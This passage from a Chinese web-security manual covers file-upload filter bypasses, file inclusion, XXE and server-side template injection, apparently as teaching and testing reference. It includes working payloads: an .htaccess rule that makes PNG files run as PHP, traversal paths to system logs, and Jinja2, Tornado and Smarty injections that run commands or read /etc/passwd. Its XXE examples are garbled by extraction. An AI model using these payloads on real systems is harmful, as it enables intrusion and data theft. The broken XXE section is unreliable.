Web-Sec Documentation, 发布 1.0
– .git/HEAD
– WEB-INF/web.xml
– .htaccess
• 特殊的备份文件
– .swp
– .swo
– .bak
– index.php~
– ...
• Python 的 Cache
– __pycache__\__init__.cpython-35.pyc
4.8 文件上传
4.8.1 文件类型检测绕过
更改请求绕过
有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。同样的，有的站点在后
端仅检查了 HTTP Header 中的信息，比如 Content-Type 等，这种检查同样可以通过修改网络请求绕过。
Magic 检测绕过
有的站点使用文件头来检测文件类型，这种检查可以在 Shell 前加入对应的字节以绕过检查。几种常见的文
件类型的头字节如下表所示
类型 二进制值
JPG FF D8 FF E0 00 10 4A 46 49 46
GIF 47 49 46 38 39 61
PNG 89 50 4E 47
TIF 49 49 2A 00
BMP 42 4D
后缀绕过
部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。
4.8. 文件上传 115
Web-Sec Documentation, 发布 1.0
php 由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht /
phtml / shtml / pwml / phtm 等可在禁止上传 php 文件时测试该类型。
jsp 引擎则可能会解析 jspx / jspf / jspa / jsw / jsv / jtml 等后缀，asp 支持 asa / asax / cer / cdx /
aspx / ascx / ashx / asmx / asp{80-90} 等后缀。
除了这些绕过，其他的后缀同样可能带来问题，如 vbs / asis / sh / reg / cgi / exe / dll / com / bat /
pl / cfc / cfm / ini 等。
系统命名绕过
在 Windows 系统中，上传 index.php. 会重命名为 . ，可以绕过后缀检查。也可尝试 index.php%20 ，
index.php:1.jpg index.php::$DATA 等。在 Linux 系统中，可以尝试上传名为 index.php/. 或 ./aa/../
index.php/. 的文件
.user.ini
在php执行的过程中，除了主php.ini之外，PHP还会在每个目录下扫描INI文件，从被执行的PHP文件
所在目录开始一直上升到web根目录（$_SERVER[’DOCUMENT_ROOT’]所指定的）。如果被执行的PHP
文件在 web 根目录之外，则只扫描该目录。.user.ini 中可以定义除了 PHP_INI_SYSTEM 以外的模式的
选项，故可以使用 .user.ini 加上非 php 后缀的文件构造一个 shell，比如 auto_prepend_file=01.gif 。
WAF 绕过
有的 waf 在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理
函数。
另外，Waf 和 Web 系统对 boundary 的处理不一致，可以使用错误的 boundary 来完成绕过。
竞争上传绕过
有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成WebShell
的文件并尝试访问，多次之后即可获得 Shell。
4.8.2 攻击技巧
Apache 重写 GetShell
Apache 可根据是否允许重定向考虑上传.htaccess
内容为
AddType application/x-httpd-php .png
php_flag engine 1
116 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
就可以用 png 或者其他后缀的文件做 php 脚本了
软链接任意读文件
上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件若服务器没有做好防护，可实现任意
文件读取的效果
4.8.3 防护技巧
• 使用白名单限制上传文件的类型
• 使用更严格的文件类型检查方式
• 限制 Web Server 对上传文件夹的解析
4.8.4 参考链接
• 构造优质上传漏洞 Fuzz 字典
4.9 文件包含
4.9.1 基础
常见的文件包含漏洞的形式为 
考虑常用的几种包含方式为
• 同目录包含 file=.htaccess
• 目录遍历 ?file=../../../../../../../../../var/lib/locate.db
• 日志注入 ?file=../../../../../../../../../var/log/apache/error.log
• 利用 /proc/self/environ
其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试
4.9.2 触发 Sink
• PHP
– include
* 在包含过程中出错会报错，不影响执行后续语句
– include_once
4.9. 文件包含 117
Web-Sec Documentation, 发布 1.0
* 仅包含一次
– require
* 在包含过程中出错，就会直接退出，不执行后续语句
– require_once
4.9.3 绕过技巧
常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式
url 编码绕过
如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过
特殊字符绕过
• 某些情况下，读文件支持使用 Shell 通配符，如 ? * 等
• url 中使用 ? # 可能会影响 include 包含的结果
• 某些情况下，unicode 编码不同但是字形相近的字符有同一个效果
%00 截断
几乎是最常用的方法，条件是 magic_quotes_gpc 关闭，而且 php 版本小于 5.3.4。
长度截断
Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。
msdn 定义 #define MAX_PATH 260，其中第 260 个字符为字符串结尾的 \0 ，而 linux 可以用 getconf 来判
断文件名长度限制和文件路径长度限制。
获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX
/root 得到 255
那么在长度有限的时候，././././ (n 个) 的形式就可以通过这个把路径爆掉
在 php 代码包含中，这种绕过方式要求 php 版本  的结构，这种结构被
称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，但是必须放在文档开头。
除了可选的开头外，XML 语法主要有以下的特性：
• 所有 XML 元素都须有关闭标签
• XML 标签对大小写敏感
• XML 必须正确地嵌套
• XML 文档必须有根元素
• XML 的属性值需要加引号
4.10. XXE 119
Web-Sec Documentation, 发布 1.0
另外，XML 也有 CDATA 语法，用于处理有多个字符需要转义的情况。
4.10.3 XXE
当允许引用外部实体时，可通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、
攻击内网网站等后果。一般的 XXE 攻击，只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读
取服务器端文件，但是也可以通过 Blind XXE 的方式实现攻击。
4.10.4 攻击方式
拒绝服务攻击
]>
&a2;
若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。具体攻击可使用更多层的迭代或递
归，也可引用巨大的外部实体，以实现攻击的效果。
文件读取
]>
&file;
SSRF
]>
4
120 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
RCE
]>
&xxe;
XInclude
4.10.5 参考链接
• XML 教程
• 未知攻焉知防 XXE 漏洞攻防
• XXE 攻击笔记分享
• 从 XML 相关一步一步到 XXE 漏洞
4.11 模版注入
4.11.1 简介
模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电
子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的
语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，
甚至在服务器上运行任意命令的表达式。
4.11.2 测试方法
• 确定使用的引擎
• 查看引擎相关的文档，确定其安全机制以及自带的函数和变量
4.11. 模版注入 121
Web-Sec Documentation, 发布 1.0
• 需找攻击面，尝试攻击
4.11.3 测试用例
• 简单的数学表达式，{{ 7+7 }} => 14
• 字符串表达式 {{ "ajin" }} => ajin
• Ruby
– 
– 
• Java
– ${7*7}
• Twig
– {{7*7}}
• Smarty
– {php}echo `id`;{/php}
• AngularJS
– $eval('1+1')
• Tornado
– 引用模块 {% import module %}
– => {% import os %}{{ os.popen("whoami").read() }}
• Flask/Jinja2
– {{ config }}
– {{ config.items() }}
– {{get_flashed_messages.__globals__['current_app'].config}}
– {{''.__class__.__mro__[-1].__subclasses__()}}
– {{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}
– {{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()
}}
• Django
– {{ request }}
– {% debug %}
122 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
– {% load module %}
– {% include "x.html" %}
– {% extends "x.html" %}
4.11.4 目标
• 创建对象
• 文件读写
• 远程文件包含
• 信息泄漏
• 提权
4.11.5 相关属性
__class__
python 中的新式类（即显示继承 object 对象的类）都有一个属性 __class__ 用于获取当前实例对应的类，
例如 "".__class__ 就可以获取到字符串实例对应的类
__mro__
python 中类对象的 __mro__ 属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中
元素的顺序是 MRO（Method Resolution Order）寻找的顺序。
__globals__
保存了函数所有的所有全局变量，在利用中，可以使用 __init__ 获取对象的函数，并通过 __globals__ 获
取 file os 等模块以进行下一步的利用
__subclasses__()
python 的新式类都保留了它所有的子类的引用，__subclasses__() 这个方法返回了类的所有存活的子类的
引用（是类对象引用，不是实例）。
因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的 __subclasses__() 方法就可以获
取想要的类的对象。